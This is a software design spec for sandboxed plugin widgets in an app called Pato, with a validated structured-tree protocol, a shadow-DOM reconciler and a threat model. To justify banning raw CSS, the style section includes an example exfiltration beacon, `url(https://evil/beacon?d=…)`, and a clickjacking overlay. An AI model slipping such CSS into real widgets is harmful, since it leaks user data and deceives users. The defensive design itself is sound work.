# Design Spec: Custom Widgets

Status: **Draft / not yet implemented.** This captures the agreed design from
brainstorming so it can be built incrementally.

## Problem

Pato ships a small set of pre-made widgets (currently only `status-widget`).
Some plugins need more control over their widget's contents than a fixed
catalog can provide. We want to let a plugin describe an arbitrary widget UI,
update it over time, and receive user-interaction events back — **without ever
giving the plugin access to the raw DOM**.

### Hard requirements

1. **No raw DOM access for plugins.** All DOM interaction goes through the
   wasm-core (Rust) and the UI plugin (webview TS). The core is the trust
   boundary and the enforcement point.
2. **Plugin isolation by pid.** A plugin can only touch widgets it owns. Node
   ids, events, and assets are all scoped by the plugin's pid, the same way
   other contexts already namespace with pid.
3. **No privileged-context XSS.** The webview holds Tauri IPC and (indirectly)
   token access. Plugin-supplied content must never reach `innerHTML` or an
   HTML parser/sanitizer. Safety comes from the content being *structured data
   that cannot express markup*, not from sanitizing strings.
4. **Language-agnostic.** The protocol is WIT records/variants — every plugin
   language gets generated types. No dependency on any UI framework's output
   (no React, no virtual-DOM-JSON convention).

Accepted residual risk: a plugin can leak data it legitimately has to another
plugin via plugin→plugin calls. Not solvable here; mitigated by Pato owning and
auditing the UI plugin.

## Chosen model: immediate-mode structured tree + reconciler in the webview

The plugin holds all of its own state. Its only job is to produce a full widget
tree (`render() -> tree`). Whenever anything changes, it hands the core the
**entire** subtree again. The webview keeps the previous tree, diffs the new one
against it, and applies the minimal set of DOM operations.

This is the egui / Elm / React-without-JSX model. It is trivial to implement in
any language ("build a struct and return it"), and the expensive part (diffing)
lives once in first-party code.

Rejected alternatives:

- **String DOM + conventions** — requires an HTML parser + sanitizer in the
  privileged webview. Perpetual XSS arms race. Rejected.
- **Retained-mode handle API** (`create_element` → handle → `set_text(h, …)`) —
  handle lifecycle across the WASM boundary is painful in every language;
  stateful protocol invites desync; large mutation surface to audit. Rejected.
- **Custom text DSL** — the syntax is option 1 + a parser we maintain; the
  *programming model* (component returns tree, framework reconciles) is what we
  actually want and is captured by the immediate-mode model above.

### Pipeline

```
plugin.render() ──WIT──▶ Rust core ──────────▶ webview reconciler ──▶ shadow DOM
 (pato:plugin/widgets)       │                        (TS)                  │
                             │                                             │
                    validate + namespace(pid)                    delegated listener
                    + translate to                                        │
                    pato:internal/widget-view                             ▼
                             ▲                                  callRust("cw_event", …)
                             │                                            │
plugin.on-event ◀──WIT───────┴────────────────────────────────────────────┘
 (pato:plugin/widget-events)
```

1. **Rust core = trust boundary.** Validates every node: tag in whitelist, every
   attribute in the per-tag whitelist with a validated value, URL schemes,
   constrained style vocabulary, tree depth / node count / byte-size / update-
   rate limits. Namespaces all node keys and the widget id with the pid.
   Translates the plugin-facing `pato:plugin/widgets` shape into the internal
   `pato:internal/widget-view` shape (this translation already exists for
   `status-widget` in `src-tauri/src/wasm/ui.rs`).
2. **Webview = dumb reconciler.** Receives the full validated tree. Keeps a
   vdom per widget id, diffs, applies ops via `createElement` / `textContent` /
   `setAttribute` (whitelist only). **Never `innerHTML`.**
3. **Isolation via Shadow DOM.** Each widget mounts in its own shadow root
   (`<pato-custom-widget>`). CSS isolation both directions; clean subtree
   boundary. No id/class prefixing scheme needed for style scoping — the shadow
   boundary does it. Host element also gets `contain: strict; overflow: clip`
   so a widget physically cannot paint outside its allotted box.
4. **Delegated event listener** on the shadow root maps a DOM event to a typed
   message → `callRust`. Core routes to the owning plugin by pid.

### Reconciliation keys

Each element may carry an optional `key` (React-style). Diffing matches by key,
falling back to positional index. Stable keys → stable DOM nodes → preserved
focus, scroll position, text selection, and in-progress IME composition across
re-renders. This is documented as the plugin author's responsibility for any
list that reorders.

## Node schema

The tree is a **flat node table**, not a recursive structure: WIT forbids
recursive types outright (`type X depends on itself`), even through `list`. So
`custom-widget` carries `nodes: list<node>` and each node points **up** to its
`parent` by index rather than down to its children:

- Node 0 is the root and the only node with `parent: none`.
- `parent` must be a lower index than the node itself → the table is
  topologically ordered and cycles are structurally impossible; the reconciler
  builds the child lists in one forward pass.
- Sibling order = table order. The first child of a parent to appear in
  `nodes` is that parent's first child.

Builder libraries hide the indexing; hand-authoring means appending to the
table with the right parent index. Each node's `kind` is a variant so text is
unambiguously inert:

```wit
record element {
  key: option<string>,
  tag: tag,
  attrs: list<attr>,
  style: option<style>,
  events: list<binding>,
}
variant node-kind {
  element(element),
  text(string),          // rendered via createTextNode — cannot carry markup
  value-slot(string),    // named cheap-update slot, see "Continuous updates"
}
record node {
  parent: option<u32>,   // none only for node 0; always < own index
  kind: node-kind,
}
```

### Tags — start minimal, grow on demand

Initial whitelist:

- layout: `div span section header footer nav ul ol li`
- text: `p h1 h2 h3 h4 h5 h6 strong em small code pre blockquote`
- interactive: `button input select option textarea label a`
- media: `img`
- data: `table thead tbody tr th td progress meter`

Permanently excluded: `script style link meta iframe embed object param base`.
Deferred (add later with dedicated handling): `svg` (offer an `icon` node with a
fixed icon set instead), `audio` `video` `source` `track`, `form` submission
semantics, `dialog` `template` `slot`.

Note: the exploratory enum currently in `core-ui.wit` contains a stray `string`
entry (copy-paste from `src-ui/lib/html.ts`) and several footgun tags
(`object`, `param`, `svg`, `map`, `area`, `audio`, `video`) — trim to the list
above.

### Attributes — typed, per-tag whitelist

```wit
variant attr {
  href(string), src(string), alt(string), title(string),
  input-type(input-type), placeholder(string), name(string),
  value(string), checked(bool), disabled(bool), rows(u32),
  min(f64), max(f64), step(f64),
}
enum input-type { text, number, checkbox, radio }
```

Rules enforced by the core:

- `img.src`, `a.href`: scheme must be `https:` or `pato-asset://<pid>/…`.
  Reject `javascript:`, `file:`, bare `data:` (allow `data:image/*` only if a
  real need appears). `pato-asset://` is a Tauri protocol handler serving files
  from the plugin's own directory, scoped by pid — this is how plugins bundle
  images without hotlinking (external `img` loads would leak the viewer's IP and
  timing to the plugin author).
- `a` with an external href: does **not** navigate the webview. Routed through a
  core "open external link" action with user confirmation.
- `input`: live value round-trips via events only; the plugin never reads the
  DOM. `type` limited to the `input-type` enum.
- No `on*` attributes ever. No raw `class` / `id` (shadow DOM removes the need).

### Style — constrained vocabulary, no raw CSS

Raw CSS strings are rejected. A raw `style: string` would let a plugin:

- `position: fixed; inset: 0; z-index: 9999` — cover the whole app for phishing
  / clickjacking over other widgets or the main UI.
- `background: url(https://evil/beacon?d=…)` — tracking beacon + exfiltration;
  CSS attribute selectors can leak sibling content character-by-character.

Instead, a typed style record with values drawn from app-level scales, so
widgets automatically match the theme and look native:

```wit
record style {
  layout: option<layout>,        // flex-row | flex-col | grid(cols: u32)
  gap: option<space>,            // spacing scale
  padding: option<space>,
  color: option<theme-color>,    // app palette (auto light/dark)
  background: option<theme-color>,
  font-size: option<text-size>,  // typography scale
  align: option<align>, justify: option<justify>,
  grow: option<bool>,
  width: option<size>, height: option<size>,   // %, tile-relative, or scale
}
```

No `position`, no `z-index`, no `url()`, no arbitrary lengths. A raw escape
hatch can be added later *only* through a strict property/value validator, if
real plugins prove they need it.

### Events — whitelisted kinds, typed minimal payloads

```wit
enum event-kind { click, input, change, submit, focus, blur, enter-key }
record binding { kind: event-kind, handler: string }

// on the element:
//   events: list<binding>
```

The core constructs the payload from a whitelist — never the raw DOM event:

```wit
variant payload {
  none,                                  // click, focus, blur, enter-key
  text(string),                          // input/change on text/number
  toggled(bool),                         // change on checkbox/radio
  fields(list<tuple<string, string>>),   // submit — only named fields
}
record event {
  widget-id: string,
  node-key: string,   // the firing binding's `handler`, not the element's `key`
  kind: event-kind,
  payload: payload,
}
on-event: func(event: event);
```

`key` and `handler` serve different jobs: `key` is reconciliation identity
(which DOM node survives a re-render), `handler` is what comes back on
`node-key` so the plugin can tell bindings apart — needed whenever one
element carries more than one binding (e.g. an `input` binding that tracks
live text plus an `enter-key` binding that submits).

Never forwarded: `target` properties, screen/client coordinates,
`relatedTarget`, clipboard, key modifiers beyond an explicit need. The core
debounces / coalesces high-frequency events (e.g. `input`) per plugin.

## Widget record

```wit
record custom-widget {
  id: string,
  nodes: list<node>,          // flat table; node 0 is the root
}
variant widget {
  status-widget(status-widget),
  custom(custom-widget),
}
update: func(widget: widget) -> bool;
```

## Grid, sizing, and responsiveness

The dashboard is a **tile grid** (tile count across TBD). A widget declares its
footprint in tiles at registration:

- Fixed: `size: { w: u32, h: u32 }` in tiles (e.g. 1×1, 2×4, 4×4, 6×8). Once
  registered the footprint is frozen from the plugin's perspective.
- Optional resizable: `min: {w,h}` / `max: {w,h}` in tiles. The user can drag
  the widget between those bounds. The plugin must then design responsively.

Users can freely reorder / move widgets on the grid. The plugin is only aware of
how many tiles it has, **not pixels** — its container is a
`contain`ed / `overflow: clip` box and the plugin lays out responsively within
it (flex/grid from the style vocab, percentage widths).

- Registration reports tile dimensions to the plugin (and updates on user
  resize).
- True pixel dimensions are **not** exposed initially. With proper responsive
  design they should not be needed. If added later: a `widget-resized` event
  with pixel w/h, opt-in per widget. Every pixel/measurement read-back is a
  potential fingerprinting / timing channel, so keep it opt-in and narrow.

Registration and layout types live in the WIT (see below):
`widgets.register(widget-spec)`, and `widget-events.on-layout(widget-layout)`
fired on mount and on every user resize.

## Continuous updates

Do not push 60fps trees over WIT. Two escape hatches:

- **`value-slot(name)` nodes** — a lightweight
  `set-value: func(widget-id: string, slot: string, value: string)` updates just
  that text node, no re-render / diff. For countdowns, counters, live numbers.
- **Declarative transitions** from the style vocab — core-controlled, no
  per-frame plugin involvement.

## Limits (DoS protection)

Enforced by the core, values TBD:

- max nodes per tree
- max tree depth
- max attribute / text string length
- max total serialized bytes per update
- max update rate per widget (excess coalesced or dropped)

## WIT — authoritative definitions

The types are defined and validated (`wasm-tools component wit`, `jco
guest-types`):

- **`src-tauri/wit/plugin.wit`** — plugin-facing. New `widget-dom` interface
  (tag / attr / style / event / node vocabulary); `widgets` gains `custom` +
  `register` / `set-value` / `request-render`; `widget-events` reworked into
  `on-status-event` (status widgets) + `on-event` (custom) + `on-layout`.
- **`src-tauri/wit-internal/core-ui.wit`** — core→webview mirror. Matching
  `widget-dom`; `widget-view` gains `custom` + `register` / `set-value` /
  `remove`; `ui-signals` gains `widget-interaction` + `widget-resized`.
- **`src-ui/generated/`** — regenerated jco `.d.ts` (checked in).

Notes on what the WIT forced vs. the sketch above:

- **Flat node table with parent pointers**, not recursive `children: list<node>`
  — WIT bans recursive types. `custom-widget.nodes` is the table; each `node`
  has `parent: option<u32>` (`none` for node 0 only, always a lower index) and
  a `node-kind` variant (`element` / `text` / `value-slot`). Sibling order is
  table order.
- **`widget-dom` is a shared interface** `use`d by the others, so the element
  vocabulary is defined once per package.
- `set-value` / `register` return `bool` for consistency with `update`.
- Status-widget events split into their own `on-status-event` rather than
  overloading the custom `on-event` payload.

## Implementation status

### Landed (v1)

- **Webview reconciler + shadow host** — `src-ui/widgets/custom-widget.ts`.
  `<pato-custom-widget>` with an open shadow root; builds the flat node table
  via `createElement` / `createTextNode` only (never `innerHTML`); keyed
  elements and `value-slot` spans keep DOM identity across renders; whitelisted
  attribute application; per-node event listeners that build a typed payload
  and `callRust("custom_widget_event", …)`. Not a full keyed list-diff yet —
  unkeyed subtrees are rebuilt each render (fine at widget scale); a real
  longest-common-subsequence reconcile is a later optimisation.
- **Theme tokens + style mapping** — `--pato-*` custom properties on `:root`
  in `src-ui/index.css` (light + dark), inherited across the shadow boundary;
  `src-ui/lib/widget-style.ts` maps the structured `Style` to a CSS string of
  `var(--pato-*)` values only.
- **Grid mount + tile sizing** — `src-ui/components/pato-grid.ts`. `pato-grid`
  is added to the page in `pato.ts` before plugins load. `widgetRegister` /
  `widgetUpdate` (custom) / `widgetSetValue` / `widgetRemove` binds in
  `src-ui/lib/widgets.ts`. Each widget lives in a `.pato-cell` wrapper with
  `grid-column/row: span N` + `aspect-ratio` from its tiles; a corner drag
  handle (shown only when `min != max`) snaps to the tile grid and persists to
  `localStorage`.
- **Core Host + validation + wire types** — `src-tauri/src/wasm/ui/`:
  `view.rs` (serde wire types + `From` conversions off the bindgen types,
  `wire_encoding_matches_jco` test), `validate.rs` (structural checks, size
  caps, per-tag attr whitelist, `pato-asset:` scoping), `mod.rs`
  (`widgets::Host` impl, `custom_widget_event` / `widget_resized` commands,
  `status_widget_clicked` / `status_widget_action` on the new
  `on-status-event`, a `REGISTERED` spec registry for resize clamping).
- **`pato-asset://` scheme** — `src-tauri/src/assets.rs`, registered on the
  Tauri builder. Serves `plugins/<dir>/assets/<path>` for the owning plugin
  only; path traversal rejected. Plugin roots tracked in `wasm.rs`'s broker.
- **Plugin** — `pato-twitch` updated for the new `widget-events`; a demo
  custom widget in `pato-twitch/src/widgets/panel.rs` (styled column, heading,
  `value-slot` user name, Refresh button whose click round-trips).

Build-verified: `cargo build` + `cargo test` (src-tauri), `cargo build
--target wasm32-wasip2` (pato-twitch), `tsc` + `esbuild` (src-ui),
`wasm-tools` + `jco`. Not yet run in the live app.

### Deferred

- **Full keyed list-diff** in the reconciler (see above).
- **`request-render` debouncing / visibility-awareness** — the Host method is
  a logged no-op; plugins call `update` directly.
- **`form` / `submit`** — `submit` is in the `event-kind` enum but nothing
  binds it (no `form` tag); `payload::fields` is unused.
- **Widget reorder / free placement** on the grid — v1 is flow layout +
  resize only.
- **`widget-view.remove`** — bind exists; no plugin-unload path calls it yet.
- **Status-widget as core-side sugar** — status widgets still render on their
  own path; folding them onto `custom` is a later refactor to avoid
  regressing a working feature.
- **`grid` layout** in the style vocab, **pixel-dimension read-back**,
  **rate-limiting** of high-frequency events.

## Open questions

- High-level component catalog (`key-values`, `button-row`, `form`,
  `progress-bar`, …) as core-side sugar emitting raw trees — still the planned
  direction, not started.
- Tiles across: currently 30 (`GRID_COLS` in `pato-grid.ts`, matching
  `index.css`); not yet a deliberate choice.
